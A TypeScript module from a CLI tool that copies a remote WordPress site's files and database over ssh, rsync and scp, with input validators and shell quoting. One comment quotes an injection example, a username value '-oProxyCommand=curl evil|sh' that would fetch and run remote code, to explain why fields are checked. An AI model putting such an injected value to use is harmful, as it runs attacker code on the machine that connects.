import path from "node:path";
import fs from "fs-extra";
import { runCommand } from "../utils/commandRunner.ts";
import { toolExists } from "./ToolCheckService.ts";
import { normalizeProfile } from "./ConfigService.ts";
import type { Profile, ResolvedProfile } from "../core/model/ResolvedProfile.ts";
import type { Spinner } from "./EnvironmentService.ts";

const SAFE_TEMPLATE_VALUE = /^[a-zA-Z0-9._@:/~-]+$/;

export function renderTemplate(template: string, variables: Record<string, unknown>): string {
  if (typeof template !== "string") throw new Error("Profile path templates must be strings.");
  return template.replace(/\{([a-zA-Z][a-zA-Z0-9]*)\}/g, (_, name) => {
    const value = variables[name];
    if (value === undefined) throw new Error(`Unknown profile template variable {${name}}.`);
    if (!SAFE_TEMPLATE_VALUE.test(String(value))) throw new Error(`Unsafe value for profile template variable {${name}}.`);
    return String(value);
  });
}

// `renderTemplate` above only validates the *substituted* portion of a
// `{placeholder}` value — a literal profile field with no placeholder at all
// (e.g. `ssh.username: "-oProxyCommand=curl evil|sh"`) passes through
// `resolve()` completely unchecked. Since these three fields are later
// concatenated straight into ssh/rsync/scp argv elements (`user@host`) or a
// shell-interpreted transport string (`-e "ssh -i <identityFile> ..."`), a
// leading "-" lets them be parsed as an option instead of a value, and most
// shell metacharacters would otherwise reach a shell verbatim. Validate the
// fully-resolved value here — the one place all three fields pass through.
function assertSafeSshField(value: string, label: string): string {
  if (!value || value.startsWith("-") || !SAFE_TEMPLATE_VALUE.test(value)) {
    throw new Error(`Unsafe value for profile field "${label}": ${JSON.stringify(value)}. Only letters, digits, and . _ @ : / ~ - are allowed, and the value must not start with "-".`);
  }
  return value;
}

export function resolveRemoteProfile(rawProfile: Profile, ctx: { projectName: string }): ResolvedProfile {
  if (!rawProfile) throw new Error("Existing WordPress setup requires --profile <name|path>.");
  const profile = normalizeProfile(rawProfile);
  const variables = { projectName: ctx.projectName };
  const resolve = (value: unknown): string => typeof value === "string" ? renderTemplate(value, variables) : (value as string);
  const ssh = {
    host: assertSafeSshField(resolve(profile.ssh.host), "ssh.host"),
    port: Number(profile.ssh.port || 22),
    username: assertSafeSshField(resolve(profile.ssh.username), "ssh.username"),
    identityFile: profile.ssh.identityFile ? assertSafeSshField(resolve(profile.ssh.identityFile).replace(/^~/, process.env.HOME || ""), "ssh.identityFile") : "",
    hostKeyPolicy: profile.ssh.hostKeyPolicy || "strict",
  };
  const projectRoot = resolve(profile.remote.projectRoot);
  const wordpressRoot = path.posix.join(projectRoot, resolve(profile.remote.wordpressRoot));
  return {
    ...profile,
    __resolved: true,
    projectName: ctx.projectName,
    ssh,
    remote: { ...profile.remote, projectRoot, wordpressRoot },
    database: mapStrings(profile.database || {}, resolve) as Profile["database"],
    urls: mapStrings(profile.urls || {}, resolve) as Profile["urls"],
    local: mapStrings(profile.local || {}, resolve),
  };
}

function mapStrings(object: Record<string, unknown>, resolver: (value: unknown) => string): Record<string, unknown> {
  return Object.fromEntries(Object.entries(object).map(([key, value]) => [key, Array.isArray(value) ? value.map(resolver) : resolver(value)]));
}

export function buildSshArgs(ssh: ResolvedProfile["ssh"], remoteCommand?: string): string[] {
  const args = ["-p", String(ssh.port)];
  if (ssh.identityFile) args.push("-i", ssh.identityFile, "-o", "IdentitiesOnly=yes");
  if (ssh.hostKeyPolicy === "accept-new") args.push("-o", "StrictHostKeyChecking=accept-new");
  if (ssh.hostKeyPolicy === "insecure") args.push("-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null");
  args.push(`${ssh.username}@${ssh.host}`);
  if (remoteCommand) args.push(remoteCommand);
  return args;
}

type Runner = typeof runCommand;

export class RemoteProfileService {
  profile: ResolvedProfile;
  run: Runner;

  constructor(profile: ResolvedProfile, runner: Runner = runCommand) { this.profile = profile; this.run = runner; }

  requiredTools(ctx: { environment?: string; skipFiles?: boolean }): string[] {
    const tools = ["ssh", ctx.environment === "lando" ? "lando" : "docker"];
    if (!ctx.skipFiles) tools.push(this.profile.files?.transport === "sftp" ? "scp" : "rsync");
    return [...new Set(tools)];
  }

  async preflight(ctx: { environment?: string; skipFiles?: boolean }): Promise<void> {
    const missing = this.requiredTools(ctx).filter((tool) => !toolExists(tool));
    if (missing.length) throw new Error(`Missing required tools: ${missing.join(", ")}. Run acli doctor with the same preset/profile.`);
    await this.run("ssh", buildSshArgs(this.profile.ssh, `test -d ${shellQuote(this.profile.remote.wordpressRoot)}`));
  }

  async syncFiles(targetDir: string, spinner: Spinner | null, { directories: namesOverride }: { directories?: string[] } = {}): Promise<void> {
    const config = this.profile.files || {};
    // Profiles are normalized (see ConfigService.normalizeProfile) before
    // reaching RemoteProfileService, so `targets` is always present here —
    // legacy `directories`/`excludes`-shaped profiles were already converted.
    const targets = config.targets || {};
    const names = namesOverride || Object.keys(targets);
    for (const name of names) {
      const target = targets[name];
      if (!target) throw new Error(`Unknown file sync target: ${name}`);
      const relativePath = target.path;
      const destination = path.join(targetDir, ...relativePath.split("/"));
      await fs.ensureDir(destination);
      spinner?.message(`Syncing ${relativePath}...`);
      const remoteSource = path.posix.join(this.profile.remote.wordpressRoot, relativePath);
      if ((config.transport || "rsync") === "sftp") {
        await this.run("scp", [...scpConnectionArgs(this.profile.ssh), "-r", `${this.profile.ssh.username}@${this.profile.ssh.host}:${remoteSource}/.`, destination]);
      } else {
        const args = ["-az"];
        for (const item of target.excludes || []) args.push("--exclude", item);
        for (const item of target.includes || []) args.push("--include", item);
        args.push("-e", sshTransport(this.profile.ssh), `${this.profile.ssh.username}@${this.profile.ssh.host}:${remoteSource}/`, `${destination}/`);
        await this.run("rsync", args);
      }
    }
  }

  async exportDatabase(targetDir: string, spinner: Spinner | null): Promise<void> {
    spinner?.message(`Exporting database with ${this.profile.database.driver} driver...`);
    const { command, stdin } = databaseCommand(this.profile);
    const dump = await this.run("ssh", buildSshArgs(this.profile.ssh, command), { encoding: null, ...(stdin !== undefined ? { stdin } : {}) });
    if (!dump || dump.length < 100) throw new Error(`Remote database dump is empty or invalid (${dump?.length || 0} bytes).`);
    // A full database dump — likely including real user password hashes —
    // should not be left world/group-readable at the default umask.
    await fs.writeFile(path.join(targetDir, "staging.sql"), dump, { mode: 0o600 });
  }

  /**
   * Fetches authoritative table prefix / site URL directly from the remote
   * WordPress install via wp-cli, instead of guessing them from the dump.
   * Only the wp-cli database driver guarantees `wp` is available remotely;
   * other drivers get nulls here and fall back to dump-based detection.
   */
  async getRemoteFacts(): Promise<{ tablePrefix: string | null; siteUrl: string | null }> {
    // An explicit database.tablePrefix override always wins and skips the
    // remote fetch for it entirely — it's available regardless of driver,
    // not just wp-cli.
    const explicitPrefix = this.profile.database?.tablePrefix || null;
    if (this.profile.database?.driver !== "wp-cli") return { tablePrefix: explicitPrefix, siteUrl: null };
    const root = shellQuote(this.profile.remote.wordpressRoot);
    const fetch = (command: string) => this.run("ssh", buildSshArgs(this.profile.ssh, `cd ${root} && ${command}`)).then((value) => (value as string)?.trim() || null).catch(() => null);
    const [fetchedPrefix, siteUrl] = await Promise.all([
      explicitPrefix ? Promise.resolve(null) : fetch("wp config get table_prefix --quiet"),
      fetch("wp option get siteurl --quiet"),
    ]);
    return { tablePrefix: explicitPrefix || fetchedPrefix, siteUrl };
  }

  async discoverGit(): Promise<{ directory: string; url: string } | null> {
    if (this.profile.git?.enabled === false) return null;
    const paths = this.profile.git?.discoveryPaths || [".", "wp-content/themes/{projectName}"];
    if (this.profile.git?.includeProjectRoot) {
      try {
        const url = await this.run("ssh", buildSshArgs(this.profile.ssh, `git -C ${shellQuote(this.profile.remote.projectRoot)} config --get remote.origin.url`)) as string;
        if (url) return { directory: ".", url: url.trim() };
      } catch { /* Continue with WordPress-relative discovery paths. */ }
    }
    for (const candidate of paths) {
      const directory = path.posix.join(this.profile.remote.wordpressRoot, renderTemplate(candidate, { projectName: this.profile.projectName }));
      try {
        const url = await this.run("ssh", buildSshArgs(this.profile.ssh, `git -C ${shellQuote(directory)} config --get remote.origin.url`)) as string;
        if (url) return { directory: candidate, url: url.trim() };
      } catch { /* Try the next allow-listed discovery path. */ }
    }
    return null;
  }
}

export interface RemoteCommand {
  /** The remote command string, passed as ssh's trailing positional argument. Never contains a secret value — see `stdin`. */
  command: string;
  /** When present, written to the ssh child process's stdin (then closed) before it runs — lets the remote script `read` a secret instead of it being embedded in `command`'s argv. */
  stdin?: string;
}

export function databaseCommand(profile: ResolvedProfile): RemoteCommand {
  const db = profile.database;
  const root = shellQuote(profile.remote.wordpressRoot);
  if (db.driver === "wp-cli") return { command: `cd ${root} && wp db export - --quiet` };
  if (db.driver === "docker") {
    if (db.discovery === "container-name") {
      const pattern = safeIdentifier(db.containerPattern || profile.projectName, "database.containerPattern");
      const executable = db.executable === "auto" ? "auto" : safeIdentifier(db.executable || "mariadb-dump", "database.executable");
      const envFile = safeRelativePath(db.envFile || ".env", "database.envFile");
      const userEnv = safeEnv(db.userEnv || "DB_USER");
      const passwordEnv = safeEnv(db.passwordEnv || "DB_PASSWORD");
      const nameEnv = safeEnv(db.nameEnv || "DB_NAME");
      const dump = executable === "auto" ? `DUMP=$(docker exec "$DBCONTAINER" sh -c 'command -v mariadb-dump || command -v mysqldump') && docker exec "$DBCONTAINER" "$DUMP"` : `docker exec "$DBCONTAINER" ${executable}`;
      return { command: `cd ${shellQuote(profile.remote.projectRoot)} && DBCONTAINER=$(docker ps --format '{{.Names}}' | grep -i ${shellQuote(pattern)} | grep -iE 'db|mariadb|mysql' | head -n 1) && test -n "$DBCONTAINER" && USER=$(grep -E ${shellQuote(`^(${userEnv}|MYSQL_USER)=`)} ${shellQuote(envFile)} | head -n 1 | cut -d= -f2- | tr -d '"' | tr -d "'") && PASS=$(grep -E ${shellQuote(`^(${passwordEnv}|MYSQL_PASSWORD)=`)} ${shellQuote(envFile)} | head -n 1 | cut -d= -f2- | tr -d '"' | tr -d "'") && NAME=$(grep -E ${shellQuote(`^(${nameEnv}|MYSQL_DATABASE)=`)} ${shellQuote(envFile)} | head -n 1 | cut -d= -f2- | tr -d '"' | tr -d "'") && ${dump} -u"$USER" -p"$PASS" "$NAME"` };
    }
    const service = safeIdentifier(db.service || "db", "database.service");
    const compose = db.composeFile ? `-f ${shellQuote(path.posix.join(profile.remote.projectRoot, db.composeFile))}` : "";
    const executable = safeIdentifier(db.executable || "mariadb-dump", "database.executable");
    return { command: `cd ${shellQuote(profile.remote.projectRoot)} && docker compose ${compose} exec -T ${service} ${executable} -u"$${safeEnv(db.userEnv || "MYSQL_USER")}" -p"$${safeEnv(db.passwordEnv || "MYSQL_PASSWORD")}" "$${safeEnv(db.nameEnv || "MYSQL_DATABASE")}"` };
  }
  const executable = safeIdentifier(db.executable || "mysqldump", "database.executable");
  const host = shellQuote(db.host || "127.0.0.1");
  const port = Number(db.port || 3306);
  // The password travels over the ssh channel's stdin, read by this script's
  // `read -r` before the dump runs, rather than being embedded in this
  // command string — that string becomes ssh's own local argv (visible via
  // `ps`/`ps aux` on *this* machine for as long as the export runs) and, on
  // the remote side, the literal argument sshd hands to `sh -c` (visible to
  // any local user on the remote host the same way). MYSQL_PWD keeps the
  // password out of the mysqldump/mariadb-dump child's own argv too, same as
  // before — only now it's set from a variable populated via `read`, not a
  // literal baked into the script.
  const password = db.password || "";
  // `read -r` reads exactly one line, so a literal newline in the password
  // would silently truncate it instead of being delivered intact.
  if (password.includes("\n")) throw new Error("database.password cannot contain a newline: the direct driver delivers it as a single line over stdin.");
  const command = `IFS= read -r ACLI_DB_PASS && MYSQL_PWD="$ACLI_DB_PASS" ${executable} -h ${host} -P ${port} -u ${shellQuote(db.user || "")} ${shellQuote(db.name || "")}`;
  return { command, stdin: `${password}\n` };
}

function safeIdentifier(value: string, label: string): string { if (!/^[a-zA-Z0-9_.-]+$/.test(value)) throw new Error(`Unsafe ${label}.`); return value; }
function safeRelativePath(value: string, label: string): string { if (!/^[a-zA-Z0-9_./-]+$/.test(value) || value.includes("..") || path.posix.isAbsolute(value)) throw new Error(`Unsafe ${label}.`); return value; }
function safeEnv(value: string): string { if (!/^[A-Z_][A-Z0-9_]*$/.test(value)) throw new Error(`Unsafe environment variable name ${value}.`); return value; }
function shellQuote(value: unknown): string { return `'${String(value).replace(/'/g, `'"'"'`)}'`; }
function sshTransport(ssh: ResolvedProfile["ssh"]): string {
  const parts = ["ssh", "-p", String(ssh.port)];
  if (ssh.identityFile) parts.push("-i", ssh.identityFile, "-o", "IdentitiesOnly=yes");
  if (ssh.hostKeyPolicy === "accept-new") parts.push("-o", "StrictHostKeyChecking=accept-new");
  if (ssh.hostKeyPolicy === "insecure") parts.push("-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null");
  // ssh.host/username/identityFile are validated in resolveRemoteProfile
  // (no shell metacharacters, no leading "-"), so joining with spaces here
  // is safe — rsync's -e option only accepts a single string, not an argv
  // array, so there is no array-based alternative to this construction.
  return parts.join(" ");
}
function scpConnectionArgs(ssh: ResolvedProfile["ssh"]): string[] { return ["-P", String(ssh.port), ...(ssh.identityFile ? ["-i", ssh.identityFile] : [])]; }
